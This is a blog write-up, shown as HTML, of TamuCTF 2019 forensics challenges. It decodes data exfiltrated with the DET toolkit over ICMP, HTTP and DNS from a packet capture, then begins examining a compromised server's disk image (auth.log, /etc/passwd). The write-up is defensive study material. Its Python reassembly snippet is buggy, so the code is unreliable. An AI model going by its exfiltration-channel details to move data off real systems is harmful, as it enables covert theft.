@@ -1,0 +1,1529 @@
+<!DOCTYPE html>
+<html lang="">
+	
+	
+
+
+	<head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta http-equiv="Cache-Control" content="public" />
+	<!-- Enable responsiveness on mobile devices -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+	
+	    
+	    
+	    
+	
+	<title>TamuCTF 2019 • Just another infosec blog</title>
+	
+	
+	<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TamuCTF 2019"/>
+<meta name="twitter:description" content="Student CTF from Texas A&amp;M University, writeups focused on forensic tasks."/>
+
+	<meta property="og:title" content="TamuCTF 2019" />
+<meta property="og:description" content="Student CTF from Texas A&amp;M University, writeups focused on forensic tasks." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://maki.bzh/walkthrough/tamuctf2019/" />
+<meta property="article:published_time" content="2019-02-28T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2019-02-28T00:00:00&#43;00:00"/>
+
+
+    		
+	
+	
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css" integrity="sha256-90Y+fvi28WF+3jKH4tHEkoQ9WLeFKJjpvCPNOtU9ZvU= sha384-s+7l2WBKs5ChgZ+esoTV0aWZRcma7BxuSHlzBJz6PH4Cc4ZX3/ErQZtk+ZzYQy/X sha512-BiC3DH0qMCjCYqPNGAthQ95QCndm60uhfQVwhqZ2eG1zuGkP+3T1cw6PzEC4CiRfRIbd2qvyN39RoDfil/XcMA==" crossorigin="anonymous">
+	
+	
+	
+
+	<link rel="stylesheet" href="/css/hyde-hyde.css" integrity="sha256-cUUT8nKBmejGAmxYnpOnspTmwap5Sjc/nzRfeTTjgeQ=" crossorigin="anonymous">
+	<link rel="stylesheet" href="/css/custom.css" >
+	<link rel="stylesheet" href="/css/print.min.css" media="print" integrity="sha256-obkLPMZU5Kb+rPwjMazkJLfYW8H9dj6yh8Gzzs2dv5c=" crossorigin="anonymous">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g= sha384-qFIkRsVO/J5orlMvxK1sgAt2FXT67og+NyFTITYzvbIP1IJavVEKZM7YWczXkwpB sha512-UDJtJXfzfsiPPgnI5S1000FPLBHMhvzAMX15I+qG2E2OAzC9P1JzUwJOfnypXiOH7MRPaqzhPbBGDNNj7zBfoA==" crossorigin="anonymous"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE= sha384-ZoaMbDF+4LeFxg6WdScQ9nnR1QC2MIRxA1O9KWEXQwns1G8UNyIEZIQidzb0T1fo sha512-qWVvreMuH9i0DrugcOtifxdtZVBBL0X75r9YweXsdCHtXUidlctw7NXg5KVP3ITPtqZ2S575A0wFkvgS2anqSA==" crossorigin="anonymous"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="shortcut icon" href="/favicon.png">
+    	
+
+</head>
+
+
+	<body >
+				
+		<div class="sidebar">
+			<div class="container sidebar-about ">
+				<span class="site__title">
+				
+					<a href=""></a>
+				</span>
+				<a href="https://maki.bzh/">
+					
+					
+					
+					<div class="author-image">
+						<img src="https://maki.bzh/img/maki.jpg" alt="Author Image" class="img--circle img--headshot element--center"/>
+					</div>
+					
+				</a>
+				<p class="site__description">
+					<a href="https://maki.bzh/en">
+						
+					</a>
+				</p>
+				<div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/walkthrough/">
+						<span>Walkthrough</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/stupidthings/">
+						<span>Stupid Things</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/ctf/">
+						<span>CTF</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/friends/">
+						<span>Friends</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/whoami/">
+						<span>Who Am I?</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+				
+				<section class="social">
+						
+						<a href="https://twitter.com/maki_mitz" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+						
+						
+						
+						
+						
+						<a href="https://gitlab.com/maki_chaz" rel="me"><i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						<a href="mailto:Yml0ZWRlcG91bGV0" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
+						
+						
+					  &nbsp;<a href="https://www.root-me.org/Maki-37744" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+					  
+						
+					  &nbsp;<a href="https://www.hackthebox.eu/home/users/profile/10265" target="blank" class="linklogo"><div class="rotate hackthebox_logo logohover"></div></a>
+					  
+						
+					  &nbsp;<a href="https://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
+					  
+</section>
+
+				
+				
+				<p class="copyright">
+					&copy; 2020 Maki.
+					<br/>
+					<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+					<br/>Built with, Haax, Laluka, _ACKNAK_
+					<a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+					
+				</p>
+			</div>
+		</div>
+
+		<div class="content container">
+			
+	<article>
+	<header>
+		<h1>TamuCTF 2019</h1>
+		
+		
+<div class="post__meta">
+	
+	<i class="fas fa-calendar-alt"></i> Feb 28, 2019
+	
+	
+	<br/>
+	<i class="fas fa-clock"></i> 18 min read
+</div>
+
+
+	</header>
+	<hr/>
+	<div class="post">
+		<nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#reading-rainbow">Reading rainbow</a>
+<ul>
+<li><a href="#0-network-enumeration">0_Network_Enumeration</a>
+<ul>
+<li><a href="#description">Description</a></li>
+</ul></li>
+<li><a href="#1-discovery">1_Discovery</a></li>
+<li><a href="#2-exfiltration">2_Exfiltration</a></li>
+<li><a href="#3-data">3_Data</a>
+<ul>
+<li><a href="#get-data-from-icmp">Get data from ICMP</a></li>
+<li><a href="#get-data-from-http">Get data from HTTP</a></li>
+<li><a href="#get-data-from-dns">Get data from DNS</a></li>
+<li><a href="#ordering-each-request">Ordering each request</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#microservices">MicroServices</a>
+<ul>
+<li><a href="#0-intrusion">0_Intrusion</a></li>
+<li><a href="#1-logs">1_Logs</a></li>
+<li><a href="#2-analysis">2_Analysis</a></li>
+<li><a href="#3-forensics">3_Forensics</a></li>
+<li><a href="#4-persistence">4_Persistence</a></li>
+</ul></li>
+<li><a href="#honeypot">Honeypot</a>
+<ul>
+<li><a href="#cowrie">Cowrie</a></li>
+<li><a href="#dionaea">Dionaea</a></li>
+<li><a href="#glastopf">Glastopf</a></li>
+<li><a href="#honeytrap">Honeytrap</a></li>
+<li><a href="#suricata">Suricata</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+		
+
+<h2 id="reading-rainbow">Reading rainbow</h2>
+
+<h3 id="0-network-enumeration">0_Network_Enumeration</h3>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>TamuCTF 2019</td>
+<td>0_Network_Enumeration</td>
+<td>Reading rainbow</td>
+<td>100</td>
+<td>~499</td>
+</tr>
+</tbody>
+</table>
+
+<h4 id="description">Description</h4>
+
+<blockquote>
+<p>Recently, the office put up a private webserver to store important information about the newest research project for the company. This information was to be kept confidential, as it&rsquo;s release could mean a large loss for everyone in the office.
+Just as the research was about to be published, a competing firm published information eerily similar. Too similar&hellip;
+Time to take a look through the office network logs to figure out what happened.</p>
+</blockquote>
+
+<pre><code>- What is the IP address of the private webserver?
+- How many hosts made contact with the private webserver that day?
+</code></pre>
+
+<table>
+<thead>
+<tr>
+<th>Filename</th>
+<th>MD5 Hash</th>
+<th>Download link</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>capture.pcap</td>
+<td>e36ff23c6995e3595035982cced6c6a9</td>
+<td><a href="https://mega.nz/#!aihUgK6I!a9Lvt6R1bBKit_bE8oOSQAUCdnl9LX_5egidhK5veRM">https://mega.nz/#!aihUgK6I!a9Lvt6R1bBKit_bE8oOSQAUCdnl9LX_5egidhK5veRM</a></td>
+</tr>
+</tbody>
+</table>
+
+<p>In this task, the challenge deal with a PCAP file, I let you check my article about <a href="/articles/wiresharkhowtobasic/">PCAP analysis</a>.</p>
+
+<p>The first flag is to find the internal IP address of a web server. Since PCAP is quite large, I just have to load it into <code>Capanalysis</code> and filter on the <strong>SSL</strong> and <strong>HTTP</strong> protocols, then filter on the IP that receives the most data:</p>
+
+<p><center>
+<img src="/img/writeups/tamuctf2019/readingrainbow/0_netenum_chall11.png" alt="" />
+<em>Fig 1</em>: Web server IP address
+</center></p>
+
+<p>It was the web server we were looking for:</p>
+
+<pre><code>Flag 1: 192.168.11.4
+</code></pre>
+
+<p>Now the second challenge is to find the number of IP addresses that have connected to this webserver. Since we know his IP address, with <code>tshark</code> it&rsquo;s pretty easy:</p>
+
+<pre><code class="language-bash">▶ tshark -r capture.pcap -Y &quot;ip.dst == 192.168.11.4&quot; -Tfields -e 'ip.src' | sort | uniq
+128.194.165.200
+172.217.6.138
+172.226.209.130
+192.168.1.1
+192.168.11.5
+192.168.11.7
+192.168.11.8
+192.168.11.9
+35.222.85.5
+35.224.99.156
+52.43.40.243
+54.213.168.194
+91.189.92.38
+
+▶ tshark -r capture.pcap -Y &quot;ip.dst == 192.168.11.4&quot; -Tfields -e 'ip.src' | sort | uniq | wc -l
+13
+</code></pre>
+
+<p>Fortunately, all connections are done on the same day::</p>
+
+<pre><code>Flag 2: 13
+</code></pre>
+
+<h3 id="1-discovery">1_Discovery</h3>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>TamuCTF 2019</td>
+<td>1_Discovery</td>
+<td>Reading rainbow</td>
+<td>100</td>
+<td>~198</td>
+</tr>
+</tbody>
+</table>
+
+<pre><code>- What is the IP address of the host exfiltrating data?
+- For how long did the exfiltration happen? (Round to the nearest second. Format: MM:SS)
+- What protocol/s was used to exfiltrate data? (Alphabetical order, all caps, comma separated, with spaces - ex: ABCD, BBCD)
+</code></pre>
+
+<p>It&rsquo;s time to open this big PCAP file in Wireshark. Thanks to the first question, we know that the attack exfiltrates some data. The best filter for that is still: <code>data.data</code>:</p>
+
+<p><center>
+<img src="/img/writeups/tamuctf2019/readingrainbow/1_disco_chall11.png" alt="" />
+<em>Fig 2</em>: Suspicious ICMP traffic
+</center></p>
+
+<p>We can see that our web server (192.168.11.4) is chatting with another host (192.168.11.7) via weird ICMP requests. Let&rsquo;s see what these requests contain:</p>
+
+<p><center>
+<img src="/img/writeups/tamuctf2019/readingrainbow/1_disco_chall12.png" alt="" />
+<em>Fig 3</em>: Filter on data
+</center></p>
+
+<p>If we get the first request with a <code>tshark</code>:</p>
+
+<pre><code class="language-bash">▶ tshark -r capture.pcap -Y &quot;data.data &amp;&amp; ip.dst == 192.168.11.4&quot; -Tfields -e 'data.text' | head -n 1 | xxd -r -p
+SEx4IRV.746f74616c6c795f6e6f7468696e672e706466.REGISTER.6156eab6691f32b8350c45b3fc4aadc1               
+</code></pre>
+
+<p>The data formatted like this looks a lot like the <a href="https://github.com/sensepost/DET">DET (Data Exfiltration Toolkit)</a> framework. I had already talked about it in a writeup at the <a href="/walkthrough/santhacklaus2018/#mission-impossible-2">SantHackLause 2018</a>.</p>
+
+<pre><code>Flag 1: 192.168.11.7
+</code></pre>
+
+<p>Now we have to determine the duration of the exfiltration. With a small filter on IPs, we see some interesting things in the <code>DNS</code>:</p>
+
+<p><center>
+<img src="/img/writeups/tamuctf2019/readingrainbow/1_disco_chall21.png" alt="" />
+<em>Fig 4</em>: Suspicious domain name
+</center></p>
+
+<p>If we extract the last DNS request and this is indeed the last DET request, we should find a &ldquo;DONE&rdquo;:</p>
+
+<pre><code class="language-bash">▶ echo -n '534578344952562e35312e444f4e45' | xxd -r -p                          
+SEx4IRV.51.DONE
+</code></pre>
+
+<p>Perfect, we know the first request with the &ldquo;REGISTER&rdquo; and the last one with the &ldquo;DONE&rdquo;.</p>
+
+<p><center>
+<img src="/img/writeups/tamuctf2019/readingrainbow/1_disco_chall23.png" alt="" />
+<img src="/img/writeups/tamuctf2019/readingrainbow/1_disco_chall22.png" alt="" />
+<em>Fig 5</em>: Timestamp
+</center></p>
+
+<pre><code class="language-bash">▶ echo $((35.49-24.40))                               
+11.090000000000003
+</code></pre>
+
+<p>The exfiltration lasted 11 minutes and 9 seconds:</p>
+
+<pre><code>Flag 2: 11.09
+</code></pre>
+
+<p>The last step will be the simplest, we already have all the information, to find the protocols, we will do a little tshark trick:</p>
+
+<pre><code class="language-bash">▶ tshark -r capture.pcap -Y &quot;ip.src == 192.168.11.4 &amp;&amp; ip.dst == 192.168.11.7&quot; -Tfields -e '_ws.col.Protocol' | sort | uniq 
+DNS
+HTTP
+ICMP
+TCP
+</code></pre>
+
+<p>The &ldquo;TCP&rdquo; protocol is not counted since it is a transport protocol (see OSI Model).</p>
+
+<pre><code>Flag 3: DNS, HTTP, ICMP
+</code></pre>
+
+<h3 id="2-exfiltration">2_Exfiltration</h3>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>TamuCTF 2019</td>
+<td>2_Exfiltration</td>
+<td>Reading rainbow</td>
+<td>100</td>
+<td>~96</td>
+</tr>
+</tbody>
+</table>
+
+<pre><code>- What is the name of the stolen file?
+- What is the md5sum of the stolen file?
+</code></pre>
+
+<p>These questions are a little bit easy since we know that the attacker used DET. First request contains both flags:</p>
+
+<pre><code>SEx4IRV.746f74616c6c795f6e6f7468696e672e706466.REGISTER.6156eab6691f32b8350c45b3fc4aadc1
+</code></pre>
+
+<ul>
+<li>SEx4IRV</li>
+<li>746f74616c6c795f6e6f7468696e672e706466</li>
+<li>REGISTER</li>
+<li>6156eab6691f32b8350c45b3fc4aadc1</li>
+</ul>
+
+<p>The first hexadecimal sequence is the name of the encoded extracted file:</p>
+
+<pre><code class="language-bash">▶ echo -n '746f74616c6c795f6e6f7468696e672e706466' | xxd -r -p                              
+totally_nothing.pdf
+</code></pre>
+
+<pre><code>Flag 1: totally_nothing.pdf
+</code></pre>
+
+<p>The second hexadecimal sequence is the MD5 hash of the encoded extracted file:</p>
+
+<pre><code>Flag 2: 6156eab6691f32b8350c45b3fc4aadc1
+</code></pre>
+
+<h3 id="3-data">3_Data</h3>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>TamuCTF 2019</td>
+<td>3_Data</td>
+<td>Reading rainbow</td>
+<td>100</td>
+<td>~79</td>
+</tr>
+</tbody>
+</table>
+
+<pre><code>- What compression encoding was used for the data?
+- What is the name and type of the decompressed file? (Format: NAME.TYPE e.g. tamuctf.txt)
+</code></pre>
+
+<p>Before answering the questions, it will be necessary to find a way to recover the original file. We know that the attacker used HTTP, DNS and ICMP protocols between IP 192.168.11.7 (attacker) and 192.168.11.4 (webserver) to extract his file. We will, therefore, use the following filter and save only the displayed packets to make a lightened PCAP file:</p>
+
+<pre><code>ip.src == 192.168.11.4 &amp;&amp; ip.dst == 192.168.11.7 &amp;&amp; (http || dns || icmp
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/tamuctf2019/readingrainbow/3_exfil_chall11.png" alt="" />
+<em>Fig 6</em>: Lightweight PCAP
+</center></p>
+
+<p>We go from 15k packets to 117, it&rsquo;s still more pleasant to analyze.</p>
+
+<h4 id="get-data-from-icmp">Get data from ICMP</h4>
+
+<p>ICMP data is sent in hexadecimal when decoding on the fly with <code>xxd</code> piped to <code>tshark</code> there is no more line break and the data becomes difficult to analyze. For that, there is <code>sed</code> which will add more returns to the line:</p>
+
+<pre><code class="language-bash">▶ tshark -r exfil.pcap -Y &quot;icmp&quot; -Tfields -e &quot;data.text&quot; | xxd -r -p | sed 's/SEx4IRV/\nSEx4IRV/g'
+SEx4IRV.746f74616c6c795f6e6f7468696e672e706466.REGISTER.6156eab6691f32b8350c45b3fc4aadc1
+SEx4IRV.2.85a846255178c4cbbd77ee999d7b7736892afaa392cf6ae7ccf9ee39f79efb9c3367325a767c1c7db414c0d4dadc4c78b0b5
+SEx4IRV.12.2bb53aaf40c5354868c984db4df8b209379f172b26dcbc5f6e99f04a130ef3e234f944e875a64f746d26fc920977987079ee
+[...]
+
+▶ tshark -r exfil.pcap -Y &quot;icmp&quot; -Tfields -e &quot;data.text&quot; | xxd -r -p | sed 's/SEx4IRV/\nSEx4IRV/g' &gt; clear_icmp
+</code></pre>
+
+<p>These are the ICMP data extracted from a file.</p>
+
+<h4 id="get-data-from-http">Get data from HTTP</h4>
+
+<p>HTTP data are sent as POST data:</p>
+
+<p><center>
+<img src="/img/writeups/tamuctf2019/readingrainbow/3_exfil_chall12.png" alt="" />
+<em>Fig 7</em>: HTTP hex encoded data
+</center></p>
+
+<p>Same process as for ICMP:</p>
+
+<pre><code class="language-bash">▶ tshark -r exfil.pcap -Y &quot;http&quot; -Tfields -e urlencoded-form.value | xxd -r -p | sed 's/SEx4IRV/\nSEx4IRV/g'               
+SEx4IRV.0.1f8b080094e16c5c0003ed596b6c1c5715beb30f7b9dd8eb4dea249b07cdb64d8493ca9b5d3b7ea4698877fd1a83ed98d40e
+SEx4IRV.1.01ea4cd7deb1bdb00f6b77b6d8018125a755b7a94390a0ca1f50a5a20a103f5ca844040236b82a25bf1250451005b9555339
+SEx4IRV.3.3960e6981a034d81000a36ed6f6a0ab6049a5b5a5120d818686c41bec047ec17a56c468ba47d3ea44512d931adfc50dcadfc
+
+▶ tshark -r exfil.pcap -Y &quot;http&quot; -Tfields -e urlencoded-form.value | xxd -r -p | sed 's/SEx4IRV/\nSEx4IRV/g' &gt; clear_http
+</code></pre>
+
+<h4 id="get-data-from-dns">Get data from DNS</h4>
+
+<p>The functioning of the DNS is a bit more different, because each request will be encoded in another.</p>
+
+<pre><code class="language-bash">▶ tshark -r exfil.pcap -Y &quot;dns&quot; -Tfields -e dns.qry.name | cut -d'.' -f2 | xxd -r -p | sed 's/SEx4IRV/\nSEx4IRV/g'
+SEx4IRV.5.a6cb22df81782e99b8f30efd5976f11c219f61477c5da8d1d1851a1fc79f60ed4ed9783b1bb3cb33bb3cd307bec21c5b11fa
+SEx4IRV.7.d868cbfe7df168433c96cc4e374cb7b534b4ecf76752fe46ea9387e9f60c0c537d32df30b4a4bc8e61a4fcedfa9fff74f35f
+SEx4IRV.8.af6baf4c5fb9f1cbf7479e0bfce2f22b44d7858af346e66396d9137c6238025db0a4cf2098419e36e0ff460bbca10cee2d83
+
+▶ tshark -r exfil.pcap -Y &quot;dns&quot; -Tfields -e dns.qry.name | cut -d'.' -f2 | xxd -r -p | sed 's/SEx4IRV/\nSEx4IRV/g' &gt; clear_dns
+</code></pre>
+
+<h4 id="ordering-each-request">Ordering each request</h4>
+
+<p>All requests must be put back in the right order. This is how DET works:</p>
+
+<ol>
+<li>File ID</li>
+<li>Packet number</li>
+<li>Data</li>
+</ol>
+
+<p>This query construction is not valid for the first (REGISTER) and last (DONE) requests.
+To put all this in order, python will do it for us. I will put all the lines in a dictionary with the packet number as the key:</p>
+
+<pre><code class="language-python">f = open('clear_data')
+a = f.read()
+f.close()
+
+final = &quot;&quot;
+tmp = {}
+
+for i in range(0,len(a)):
+	tmp[int(a[i].split('.')[1])] = a[i].split('.')[2]
+
+for j in range(0,len(tmp)):
+	final = tmp[j]
+
+g = open('result','wb')
+g.write(final)
+g.close()
+</code></pre>
+
+<p>Here is what we obtain:</p>
+
+<pre><code class="language-bash">▶ file result 
+result: ASCII text, with very long lines, with no line terminators
+
+▶ cat result                    
+1f8b080094e16c5c0003ed596b6c1c5715beb30f7b9dd8eb4dea249b07cdb64d8493ca9b5d3b7ea4698877fd1a83ed98d40e01ea4cd7deb1bdb00f6b7
+[...]
+
+▶ cat result | xxd -r -p &gt; test 
+
+▶ file test    
+test: gzip compressed data, last modified: Wed Feb 20 05:11:48 2019, from Unix, original size 10240
+</code></pre>
+
+<p>Remember the first question of the challenge is the type of compression used:</p>
+
+<pre><code>Flag 1: gzip
+</code></pre>
+
+<p>Now, let&rsquo;s uncompress the archive and got the original file:</p>
+
+<pre><code class="language-bash">▶ mv test test.gz                                                             
+                                                                        
+▶ gzip -d test.gz            
+                                                                        
+▶ file test 
+test: POSIX tar archive (GNU)
+                                                                          
+▶ tar xvf test    
+stuff                                                                            
+▶ file stuff 
+stuff: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e228bab316deed74b478d8f5bdef5d8c30bbd1b4, not stripped
+</code></pre>
+
+<p>And now, let&rsquo;s validate the last flag:</p>
+
+<pre><code>Flag 2: stuff.elf
+</code></pre>
+
+<hr />
+
+<h2 id="microservices">MicroServices</h2>
+
+<h3 id="0-intrusion">0_Intrusion</h3>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>TamuCTF 2019</td>
+<td>0_Intrusion</td>
+<td>MicroServices</td>
+<td>100</td>
+<td>~669</td>
+</tr>
+</tbody>
+</table>
+
+<blockquote>
+<p>Welcome to MicroServices inc, where do all things micro and service oriented!
+Recently we got an alert saying there was suspicious traffic on one of our web servers. Can you help us out?</p>
+</blockquote>
+
+<table>
+<thead>
+<tr>
+<th>Filename</th>
+<th>MD5 hash</th>
+<th>Download link</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>microservice.pcap</td>
+<td>18d2c48f5d03d5faa5cb4473f9819b4b</td>
+<td><a href="https://mega.nz/#!Gv5zAahB!afQTRfSLEE93xDDoZbi0EoGLrGzshAALLCS-1LwykdY">https://mega.nz/#!Gv5zAahB!afQTRfSLEE93xDDoZbi0EoGLrGzshAALLCS-1LwykdY</a></td>
+</tr>
+</tbody>
+</table>
+
+<pre><code>- What is the IP Address of the attacker?
+</code></pre>
+
+<p>For this flag I don&rsquo;t have any real analysis, I just opened the PCAP file and looked at the different TCP conversations. The IP that sends the most data and voila:</p>
+
+<p><center>
+<img src="/img/writeups/tamuctf2019/microservice/0_intru_chall11.png" alt="" />
+<em>Fig 7</em>: Malicious IP
+</center></p>
+
+<pre><code>Flag: 10.91.9.93
+</code></pre>
+
+<h3 id="1-logs">1_Logs</h3>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>TamuCTF 2019</td>
+<td>1_Logs</td>
+<td>MicroServices</td>
+<td>100</td>
+<td>~179</td>
+</tr>
+</tbody>
+</table>
+
+<blockquote>
+<p>Thanks for discovering the malicious IP. We will add it to our block list. We also got a disk image of the web server while you were working. Can you dig a little deeper for us?</p>
+</blockquote>
+
+<table>
+<thead>
+<tr>
+<th>Filename</th>
+<th>MD5</th>
+<th>Download link</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>filesystem.image</td>
+<td>490c78e249177e6478539f459ca14e87</td>
+<td><a href="https://drive.google.com/uc?id=19zgsmqMZ_QltLYzWcCdxizV9Wipj-2NI&amp;export=download">https://drive.google.com/uc?id=19zgsmqMZ_QltLYzWcCdxizV9Wipj-2NI&amp;export=download</a></td>
+</tr>
+</tbody>
+</table>
+
+<pre><code>- What user was the attacker able to login as?
+- What is the date &amp; time that the attacker logged in? (MM/DD:HH:MM:SS)
+</code></pre>
+
+<p>Once the archive is finally downloaded, we&rsquo;ll mount it in readonly to avoid screwing everything inside:</p>
+
+<pre><code class="language-bash">▶ mkdir aaa
+▶ sudo mount -o ro filesystem.image aaa
+</code></pre>
+
+<p>We know the attacker&rsquo;s IP (10.91.9.93) and we are looking for a connection. Let&rsquo;s see what the <code>auth.log</code> file contains:</p>
+
+<pre><code class="language-bash">➜  microservices cat aaa/var/log/auth.log | grep '10.91.9.93'
+Feb 17 00:06:04 ubuntu-xenial sshd[15799]: Accepted publickey for root from 10.91.9.93 port 41592 ssh2: RSA SHA256:lR4653Hv/Y9QthWvXFB2KkNPzQ1r8mItv83OgiCAR4g
+</code></pre>
+
+<p>We got all flags immediately:</p>
+
+<pre><code>Flag 1: root
+Flag 2: 02/17:00:06:04
+</code></pre>
+
+<h3 id="2-analysis">2_Analysis</h3>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>TamuCTF 2019</td>
+<td>2_Analysis</td>
+<td>MicroServices</td>
+<td>100</td>
+<td>~96</td>
+</tr>
+</tbody>
+</table>
+
+<blockquote>
+<p>Thanks for that information. Can you take a deeper dive now and figure out exactly how the attacker go in?</p>
+</blockquote>
+
+<pre><code>- What is the name of the service that was used to compromise the machine? (All lowercase)
+- What is the md5sum of the initial compromising file?
+- What specific line in the initial compromising file was the most dangerous? (Actual line, spaces in front don't matter)
+</code></pre>
+
+<p>During an investigation, my first reflex is to go to the folders of the different users (<code>/home</code>, <code>/root</code>):</p>
+
+<pre><code class="language-bash">➜  microservices tree -a -f aaa/root
+aaa/root
+├── aaa/root/.bashrc
+├── aaa/root/.cache
+│   └── aaa/root/.cache/motd.legal-displayed
+├── aaa/root/.profile
+└── aaa/root/.ssh
+    ├── aaa/root/.ssh/authorized_keys
+    └── aaa/root/.ssh/id_rsa
+
+➜  microservices tree -a -f aaa/home
+aaa/home
+└── aaa/home/ubuntu
+    ├── aaa/home/ubuntu/.ansible
+    │   └── aaa/home/ubuntu/.ansible/tmp
+    │       └── aaa/home/ubuntu/.ansible/tmp/ansible-tmp-1550362148.9-21461470003029
+    │           └── aaa/home/ubuntu/.ansible/tmp/ansible-tmp-1550362148.9-21461470003029/command
+    ├── aaa/home/ubuntu/.bash_logout
+    ├── aaa/home/ubuntu/.bashrc
+    ├── aaa/home/ubuntu/.cache
+    │   └── aaa/home/ubuntu/.cache/motd.legal-displayed
+    ├── aaa/home/ubuntu/.data
+    │   ├── aaa/home/ubuntu/.data/mysql
+    │   │   ├── aaa/home/ubuntu/.data/mysql/aria_log.00000001
+    │   │   ├── aaa/home/ubuntu/.data/mysql/aria_log_control
+    │   │   ├── aaa/home/ubuntu/.data/mysql/customers
+    │   │   │   ├── aaa/home/ubuntu/.data/mysql/customers/customer_info.frm
+    │   │   │   ├── aaa/home/ubuntu/.data/mysql/customers/customer_info.ibd
+    │   │   │   └── aaa/home/ubuntu/.data/mysql/customers/db.opt
+    │   │   ├── aaa/home/ubuntu/.data/mysql/ib_buffer_pool
+    │   │   ├── aaa/home/ubuntu/.data/mysql/ibdata1
+[LOOOOOOTS OF MYSQL FILES]
+    │   │   ├── aaa/home/ubuntu/.data/mysql/performance_schema
+    │   │   │   └── aaa/home/ubuntu/.data/mysql/performance_schema/db.opt
+    │   │   └── aaa/home/ubuntu/.data/mysql/tc.log
+    │   └── aaa/home/ubuntu/.data/redis
+    ├── aaa/home/ubuntu/docker-compose.yml
+    ├── aaa/home/ubuntu/id_rsa.pub
+    ├── aaa/home/ubuntu/logs
+    │   ├── aaa/home/ubuntu/logs/access.log
+    │   ├── aaa/home/ubuntu/logs/error.log
+    │   └── aaa/home/ubuntu/logs/other_vhosts_access.log
+    ├── aaa/home/ubuntu/.profile
+    ├── aaa/home/ubuntu/.ssh
+    │   └── aaa/home/ubuntu/.ssh/authorized_keys
+    └── aaa/home/ubuntu/.sudo_as_admin_successful
+
+13 directories, 112 files
+</code></pre>
+
+<p>We will search in the <code>/etc/passwd</code> file if there are no other users who have can access to a <strong>bash</strong>:</p>
+
+<pre><code class="language-bash">➜  microservices cat aaa/etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+dev:x:0:0:root:/root:/bin/bash
+</code></pre>
+
+<p>It&rsquo;s funny, the user <code>dev</code> has <code>/root</code> as $HOME directory&hellip;</p>
+
+<p>We see a <code>docker-composes.yml</code> file in the user&rsquo;s directory <strong>ubuntu</strong>:</p>
+
+<pre><code class="language-bash">➜  microservices cat aaa/home/ubuntu/docker-compose.yml 
+version: '2'
+
+services:
+  web:
+    image: tamuctf/webfront:latest
+    restart: always
+    ports:
+      - &quot;80:80&quot;
+    environment:
